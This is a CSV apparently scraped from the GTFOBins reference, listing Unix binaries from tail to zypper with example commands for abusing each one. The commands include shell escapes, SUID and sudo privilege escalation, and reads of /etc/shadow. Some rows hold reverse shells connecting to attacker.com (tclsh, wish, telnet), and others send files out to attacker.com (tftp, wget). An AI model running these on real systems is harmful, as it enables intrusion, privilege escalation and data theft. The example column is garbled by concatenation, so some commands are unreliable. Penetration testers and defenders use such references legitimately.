Binary Name,URL,Description,Functions,Examples
tail,https://gtfobins.github.io/gtfobins/tail/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
tail -c1G ""$LFILE""; sh -p; -p"
tar,https://gtfobins.github.io/gtfobins/tar/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File write; File read; Sudo; Limited SUID,"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh; tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'; TF=$(mktemp)
echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*"
task,https://gtfobins.github.io/gtfobins/task/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,task execute /bin/sh; sudo; sudo task execute /bin/sh
taskset,https://gtfobins.github.io/gtfobins/taskset/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,taskset 1 /bin/sh; sh -p; -p
tasksh,https://gtfobins.github.io/gtfobins/tasksh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"tasksh
!/bin/sh; sudo; sudo tasksh
!/bin/sh"
tbl,https://gtfobins.github.io/gtfobins/tbl/,The read file content is corrupted by additional text at the beginning.,File read; SUID; Sudo,"LFILE=file_to_read
tbl $LFILE; sh -p; -p"
tclsh,https://gtfobins.github.io/gtfobins/tclsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; SUID; Sudo,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
tcpdump,https://gtfobins.github.io/gtfobins/tcpdump/,These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.,Command; Sudo,"postrotate-command; COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF; sudo"
tdbtool,https://gtfobins.github.io/gtfobins/tdbtool/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"tdbtool
! /bin/sh; sudo; sudo tdbtool
! /bin/sh"
tee,https://gtfobins.github.io/gtfobins/tee/,It can only append data if the destination exists.,File write; SUID; Sudo,"LFILE=file_to_write
echo DATA | ./tee -a ""$LFILE""; sh -p; -p"
telnet,https://gtfobins.github.io/gtfobins/telnet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Sudo; Limited SUID,"RHOST=attacker.com
RPORT=12345
telnet $RHOST $RPORT
^]
!/bin/sh; nc -l -p 12345; RHOST=attacker.com
RPORT=12345
TF=$(mktemp -u)
mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
terraform,https://gtfobins.github.io/gtfobins/terraform/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"terraform console
file(""file_to_read""); sh -p; -p"
tex,https://gtfobins.github.io/gtfobins/tex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,tex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo tex --shell-escape '\write18{/bin/sh}\end'
tftp,https://gtfobins.github.io/gtfobins/tftp/,It can exfiltrate files on the network.,File upload; File download; SUID; Sudo,"RHOST=attacker.com
tftp $RHOST
put file_to_send; RHOST=attacker.com
tftp $RHOST
get file_to_get; sh -p"
tic,https://gtfobins.github.io/gtfobins/tic/,"The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
tic -C ""$LFILE""; sh -p; -p"
time,https://gtfobins.github.io/gtfobins/time/,"Note that the shell might have its own builtin time implementation, which may behave differently than /usr/bin/time, hence the absolute path.",Shell; SUID; Sudo,/usr/bin/time; /usr/bin/time /bin/sh; sh -p
timedatectl,https://gtfobins.github.io/gtfobins/timedatectl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; timedatectl list-timezones
!/bin/sh; sudo"
timeout,https://gtfobins.github.io/gtfobins/timeout/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,timeout 7d /bin/sh; sh -p; -p
tmate,https://gtfobins.github.io/gtfobins/tmate/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,tmate -c /bin/sh; sudo; sudo tmate -c /bin/sh
tmux,https://gtfobins.github.io/gtfobins/tmux/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"tmux; tmux -S /path/to/socket_name; LFILE=file_to_read
tmux -f $LFILE"
top,https://gtfobins.github.io/gtfobins/top/,"This requires that an existing configuration file is present, to create one run top then type Wq. Note down the actual configuration file path and use it in the below examples.",Shell; Sudo,"top; Wq; echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset"
torify,https://gtfobins.github.io/gtfobins/torify/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,torify /bin/sh; sudo; sudo torify /bin/sh
torsocks,https://gtfobins.github.io/gtfobins/torsocks/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,torsocks /bin/sh; sudo; sudo torsocks /bin/sh
troff,https://gtfobins.github.io/gtfobins/troff/,"The file is typeset but text is still readable in the output, alternatively the output can be read with man -l.",File read; SUID; Sudo,"man -l; LFILE=file_to_read
troff $LFILE; sh -p"
tshark,https://gtfobins.github.io/gtfobins/tshark/,This program is able to execute lua code.,Shell,"lua; TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF"
ul,https://gtfobins.github.io/gtfobins/ul/,The read file content is corrupted by replacing occurrences of $'\b_' to terminal sequences and by converting tabs to spaces.,File read; SUID; Sudo,"$'\b_'; LFILE=file_to_read
ul ""$LFILE""; sh -p"
unexpand,https://gtfobins.github.io/gtfobins/unexpand/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
unexpand -t99999999 ""$LFILE""; sh -p; -p"
uniq,https://gtfobins.github.io/gtfobins/uniq/,The read file content is corrupted by squashing multiple adjacent lines.,File read; SUID; Sudo,"LFILE=file_to_read
uniq ""$LFILE""; sh -p; -p"
unshare,https://gtfobins.github.io/gtfobins/unshare/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,unshare /bin/sh; sh -p; -p
unsquashfs,https://gtfobins.github.io/gtfobins/unsquashfs/,unsquashfs preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:,SUID; Sudo,"unsquashfs; cp /bin/sh .
chmod +s sh
mksquashfs sh shell; -p"
unzip,https://gtfobins.github.io/gtfobins/unzip/,Certain unzip versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:,SUID; Sudo,"unzip; cp /bin/sh .
chmod +s sh
zip shell.zip sh; -p"
update-alternatives,https://gtfobins.github.io/gtfobins/update-alternatives/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
uudecode,https://gtfobins.github.io/gtfobins/uudecode/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode; sh -p; -p"
uuencode,https://gtfobins.github.io/gtfobins/uuencode/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
uuencode ""$LFILE"" /dev/stdout | uudecode; sh -p; -p"
vagrant,https://gtfobins.github.io/gtfobins/vagrant/,"This allows to execute ruby code, other functions may apply.",Shell; SUID; Sudo,"ruby; cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up; sh -p"
valgrind,https://gtfobins.github.io/gtfobins/valgrind/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,valgrind /bin/sh; sudo; sudo valgrind /bin/sh
varnishncsa,https://gtfobins.github.io/gtfobins/varnishncsa/,"This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start varnishncsa as follows, then trigger the file write with:",SUID; Sudo,varnishncsa; curl -H 'yyy: DATA' http://localhost:6081/xxx; sh -p
vi,https://gtfobins.github.io/gtfobins/vi/,Modern Unix systems run vim binary when vi is called.,Shell; File write; File read; Sudo,vim; vi; vi -c ':!/bin/sh' /dev/null
view,https://gtfobins.github.io/gtfobins/view/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"view -c ':!/bin/sh'; view
:set shell=/bin/sh
:shell; view"
vigr,https://gtfobins.github.io/gtfobins/vigr/,"This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo.",SUID; Sudo,/etc/passwd; /etc/group; /etc/shadow
vim,https://gtfobins.github.io/gtfobins/vim/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,vim -c ':!/bin/sh'; vim --cmd ':set shell=/bin/sh|:shell'; vim
vimdiff,https://gtfobins.github.io/gtfobins/vimdiff/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"vimdiff -c ':!/bin/sh'; vimdiff
:set shell=/bin/sh
:shell; vimdiff"
vipw,https://gtfobins.github.io/gtfobins/vipw/,"This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo.",SUID; Sudo,/etc/passwd; /etc/group; /etc/shadow
virsh,https://gtfobins.github.io/gtfobins/virsh/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; Sudo,libvirt; pool-create-as; --build
volatility,https://gtfobins.github.io/gtfobins/volatility/,"This command requires some valid coredump file which, if not available, can be uploaded to the target. The volshell command spawns a python shell, other functions may apply.",Shell,"volshell; python; volatility -f file.dump volshell
__import__('os').system('/bin/sh')"
w3m,https://gtfobins.github.io/gtfobins/w3m/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
w3m ""$LFILE"" -dump; sh -p; -p"
wall,https://gtfobins.github.io/gtfobins/wall/,The textual file is dumped on the current TTY (neither to stdout nor to stderr).,Sudo,stdout; stderr; sudo
watch,https://gtfobins.github.io/gtfobins/watch/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo; Limited SUID,watch -x sh -c 'reset; exec sh 1>&0 2>&0'; sh -p; -p
wc,https://gtfobins.github.io/gtfobins/wc/,"The file content is parsed as a sequence of \x00 separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.",File read; SUID; Sudo,"\x00; LFILE=file_to_read
wc --files0-from ""$LFILE""; sh -p"
wget,https://gtfobins.github.io/gtfobins/wget/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File write; File read; SUID; Sudo,"TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0; --post-data; URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL"
whiptail,https://gtfobins.github.io/gtfobins/whiptail/,"The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",File read; SUID; Sudo,"LFILE=file_to_read
whiptail --textbox --scrolltext ""$LFILE"" 0 0; sh -p; -p"
whois,https://gtfobins.github.io/gtfobins/whois/,whois hangs waiting for the remote peer to close the socket.,File upload; File download,"whois; nc -l -p 12345 > ""file_to_save""; $'\x0d\x0a'"
wireshark,https://gtfobins.github.io/gtfobins/wireshark/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; Sudo,lua; wireshark; sudo
wish,https://gtfobins.github.io/gtfobins/wish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Sudo,"wish
exec /bin/sh <@stdin >@stdout 2>@stderr; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
xargs,https://gtfobins.github.io/gtfobins/xargs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,xargs -a /dev/null sh; echo x | xargs -Iy sh -c 'exec sh 0<&1'; stdin
xdg-user-dir,https://gtfobins.github.io/gtfobins/xdg-user-dir/,"The current implementation of xdg-user-dir is basically eval echo \${XDG_${1}_DIR:-$HOME}, thus is can be easily used to achieve command execution.",Shell; Sudo,xdg-user-dir; eval echo \${XDG_${1}_DIR:-$HOME}; xdg-user-dir '}; /bin/sh #'
xdotool,https://gtfobins.github.io/gtfobins/xdotool/,This requires a running X server.,Shell; SUID; Sudo,xdotool exec --sync /bin/sh; sh -p; -p
xelatex,https://gtfobins.github.io/gtfobins/xelatex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi; sudo"
xetex,https://gtfobins.github.io/gtfobins/xetex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,xetex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo xetex --shell-escape '\write18{/bin/sh}\end'
xmodmap,https://gtfobins.github.io/gtfobins/xmodmap/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
xmodmap -v $LFILE; sh -p; -p"
xmore,https://gtfobins.github.io/gtfobins/xmore/,"The file is displayed in a Xorg window, so it needs a working graphical environment.",File read; SUID; Sudo,"LFILE=file_to_read
xmore $LFILE; sh -p; -p"
xpad,https://gtfobins.github.io/gtfobins/xpad/,This is a GUI application. The file content is displayed in a sticky note.,File read; Sudo,"LFILE=file_to_read
xpad -f ""$LFILE""; sudo; LFILE=file_to_read
sudo xpad -f ""$LFILE"""
xxd,https://gtfobins.github.io/gtfobins/xxd/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
echo DATA | xxd | xxd -r - ""$LFILE""; LFILE=file_to_read
xxd ""$LFILE"" | xxd -r; sh -p"
xz,https://gtfobins.github.io/gtfobins/xz/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
xz -c ""$LFILE"" | xz -d; sh -p; -p"
yarn,https://gtfobins.github.io/gtfobins/yarn/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,yarn exec /bin/sh; preinstall; yarn --cwd $TF run preinstall
yash,https://gtfobins.github.io/gtfobins/yash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,yash; sh -p; -p
yelp,https://gtfobins.github.io/gtfobins/yelp/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read,"LFILE=file_to_read
yelp ""man:$LFILE"""
yum,https://gtfobins.github.io/gtfobins/yum/,It can download remote files.,File download; Sudo,.rpm; /var/tmp; /var/tmp/yum-root-cR0O4h/
zathura,https://gtfobins.github.io/gtfobins/zathura/,"The interaction happens in a GUI window, while the shell is dropped in the terminal.",Shell; Sudo,"zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'; sudo; sudo zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'"
zip,https://gtfobins.github.io/gtfobins/zip/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF; LFILE=file-to-read
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF; sudo"
zsh,https://gtfobins.github.io/gtfobins/zsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"zsh; export LFILE=file_to_write
zsh -c 'echo DATA >$LFILE'; export LFILE=file_to_read
zsh -c 'echo ""$(<$LFILE)""'"
zsoelim,https://gtfobins.github.io/gtfobins/zsoelim/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
zsoelim ""$LFILE""; sh -p; -p"
zypper,https://gtfobins.github.io/gtfobins/zypper/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,/bin/sh; /usr/lib/zypper/commands/zypper-x; zypper x
